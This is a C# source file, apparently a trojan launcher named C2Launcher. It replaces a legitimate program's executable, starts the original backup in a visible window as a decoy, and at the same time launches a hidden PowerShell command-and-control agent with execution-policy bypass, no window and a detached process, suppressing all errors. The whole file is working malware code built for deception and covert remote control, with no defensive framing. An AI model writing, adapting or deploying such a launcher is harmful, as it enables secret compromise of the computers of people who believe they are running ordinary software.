using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace C2Launcher {
    class Program {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll")]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();

        struct STARTUPINFO {
            public int cb;
            public string lpReserved, lpDesktop, lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        struct PROCESS_INFORMATION {
            public IntPtr hProcess, hThread;
            public uint dwProcessId, dwThreadId;
        }

        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint STARTF_USESHOWWINDOW = 1;
        const uint DETACHED_PROCESS = 0x00000008;

        static void Main() {
            // Hide console immediately
            FreeConsole();

            string dir = Path.GetDirectoryName(typeof(Program).Assembly.Location);
            string originalExe = dir + "\\original.exe.bak";

            // Start original program (visible, normal window)
            if (File.Exists(originalExe)) {
                try {
                    Process.Start(new ProcessStartInfo {
                        FileName = originalExe,
                        WorkingDirectory = dir,
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                } catch { }
            }

            // Start PowerShell C2 agent (completely hidden, no window at all)
            string psScript = dir + "\\c2\\agent.ps1";
            string serverCfg = dir + "\\c2\\server.cfg";
            if (!File.Exists(psScript)) {
                // Try alternate paths
                psScript = Path.GetFullPath(dir + "\\..\\c2\\agent.ps1");
            }
            if (File.Exists(psScript)) {
                try {
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = 0;

                    PROCESS_INFORMATION pi;
                    CreateProcess(
                        null,
                        "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + psScript + "\"",
                        IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW | DETACHED_PROCESS,
                        IntPtr.Zero, dir, ref si, out pi
                    );
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                } catch { }
            }
        }

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
    }
}
